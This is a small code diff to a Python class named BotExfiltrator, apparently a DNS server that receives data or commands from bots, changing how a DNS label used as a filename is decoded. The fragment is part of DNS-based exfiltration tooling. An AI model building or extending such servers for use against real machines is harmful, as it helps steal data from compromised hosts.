@@ -52,7 +52,7 @@ class BotExfiltrator(DNSServer):
         return RR(name, QTYPE.A, rdata=A(), ttl=0)
 
     def A(self, name):
-        rfilename = name.label[1].encode('utf-8')
+        rfilename = name.label[1].decode('utf-8')
         host = self.client_address[0]
         if rfilename == self.context['cmd']:
             lfilename = rfilename
